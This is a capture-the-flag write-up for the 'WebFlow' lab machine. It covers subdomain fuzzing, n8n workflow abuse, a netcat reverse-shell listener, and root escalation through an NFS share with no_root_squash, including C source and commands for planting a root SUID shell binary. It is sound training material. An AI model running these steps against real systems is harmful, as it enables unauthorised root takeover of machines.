# WebFlow — HackingClub

## Machine Information

| Attribute  | Value                                   |
| ---------- | --------------------------------------- |
| Platform   | HackingClub                             |
| Machine    | WebFlow                                 |
| Difficulty | Easy                                    |
| OS         | Linux                                   |
| Category   | Web Exploitation / Privilege Escalation |

---

# Overview

This write-up documents the exploitation process for the **WebFlow** machine on the **HackingClub** platform.

The attack chain involved the following stages:

* Subdomain enumeration
* Web application analysis
* n8n workflow abuse
* Credential extraction
* Reverse shell access
* NFS misconfiguration discovery
* Privilege escalation via **SUID binary placed through NFS**

Instead of only reproducing the provided solution, I focused on understanding **why the attack works**, especially the **NFS privilege escalation technique**, which was a new concept for me.

---

# Reconnaissance

The first step was identifying exposed services using **Nmap**.

```bash
nmap -p- -Pn --open --min-rate 1200 172.16.9.54
```

After identifying open ports, a more detailed scan was performed.

```bash
nmap -p PORTS -sVC 172.16.9.54 -vvv
```

This allowed identification of the services running on the system.

The most interesting target was the **web service**, which became the initial attack vector.

---

# Subdomain Enumeration

The main webpage did not expose significant information, so I began searching for **virtual hosts and subdomains**.

Initially I attempted subdomain fuzzing incorrectly by placing the wordlist directly in the URL:

```
http://FUZZ.webflow.hc
```

However, this approach does not work when DNS resolution fails.

To properly enumerate subdomains on the same server, the **HTTP Host header** must be manipulated.

Correct command:

```bash
ffuf -u http://webflow.hc \
-H "Host: FUZZ.webflow.hc" \
-w subdomains-top1million.txt \
-c -t 100 -fl 1
```

Explanation:

* `-H "Host: FUZZ.webflow.hc"` forces the web server to treat the request as a different virtual host.
* `FUZZ` is replaced with entries from the wordlist.
* The request still goes to the same IP, but the server routes it based on the Host header.

This enumeration eventually revealed a new subdomain hosting an **n8n workflow panel**.

---

# Web Application Analysis

Accessing the discovered subdomain exposed an **n8n instance**.

n8n is an automation platform used to create workflows that can interact with external systems, APIs, or scripts.

Because workflow engines often execute commands or scripts internally, they represent a valuable attack surface.

Exploring the interface and configuration eventually revealed **credentials and secrets stored within the application environment**.

These credentials allowed further interaction with the system.

---

# Initial Shell Access

After experimenting with the workflow functionality, it became possible to trigger **command execution**.

A reverse shell listener was prepared on the attacking machine.

```bash
nc -lvnp 443
```

Then a reverse shell payload was executed through the workflow.

Once the connection was established, a shell was obtained as:

```
www-data
```

---

# Shell Stabilization

To obtain a fully interactive shell, stabilization techniques were used.

```bash
script /dev/null -c bash
```

Then:

```
CTRL + Z
stty raw -echo; fg
```

This enables proper terminal interaction and command execution.

---

# System Enumeration

After gaining shell access, standard Linux enumeration was performed.

While inspecting services and filesystem configuration, an interesting finding appeared.

The system had an **NFS share exported from `/tmp`**.

Misconfigured NFS shares can lead to privilege escalation depending on their export configuration.

---

# NFS Mount

From the attacking machine, the remote NFS share was mounted.

```bash
sudo mount -t nfs 172.16.9.54:/tmp /tmp/malicious
```

This allowed interaction with the remote `/tmp` directory as if it were local.

At this point, I suspected a possible **NFS privilege configuration issue**.

---

# Understanding the Vulnerability

The vulnerability relies on an NFS export configuration using:

```
no_root_squash
```

Normally NFS performs **root squashing**, which maps root operations on the client to a restricted user such as `nobody`.

However, when **no_root_squash** is enabled:

* root on the client machine
* remains root on the server

This means files created by root on the mounted share will remain **owned by root on the target system**.

This behavior can be abused to place **SUID root binaries** on the server.

---

# Privilege Escalation Strategy

To exploit this behavior, a custom **SUID root binary** was created.

First, a simple C program was written:

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Compile the program:

```bash
gcc exploit.c -o exploit
```

Copy the binary into the mounted NFS directory:

```bash
cp exploit /tmp/malicious/
```

Set ownership and SUID permissions:

```bash
sudo chown root:root /tmp/malicious/exploit
sudo chmod 4755 /tmp/malicious/exploit
```

Because the share allows **root-level file operations**, the binary becomes a **root-owned SUID executable on the target system**.

---

# Root Access

Returning to the shell on the victim machine, the binary could now be executed.

```bash
/tmp/exploit
```

This immediately spawned a **root shell**.

Verification:

```bash
whoami
```

Output:

```
root
```

---

# Root Flag

Finally, the root flag was retrieved.

```bash
cd /root
cat root.txt
```

---

# Skills Practiced

* Subdomain enumeration with ffuf
* HTTP Host header fuzzing
* Web application analysis
* Workflow engine exploitation
* Reverse shell techniques
* Shell stabilization
* NFS misconfiguration exploitation
* SUID privilege escalation
* Basic exploit development in C

---

# Final Result

Machine successfully compromised.

```
User: root
System: Linux
Platform: HackingClub
Machine: WebFlow
Difficulty: Easy
```

---

# Personal Notes

One of the most interesting parts of this machine was the **NFS privilege escalation technique**.

Initially I followed the steps from the solution, but I took time to understand why the attack works.

The key concept is the **no_root_squash** configuration.

When this option is enabled, root on the client machine remains root on the NFS server. This allows an attacker to create files that remain owned by root on the target system.

By planting a **SUID root binary**, an attacker can escalate privileges and gain full control of the system.

Understanding the **underlying mechanism** behind the attack is far more valuable than simply reproducing the steps.
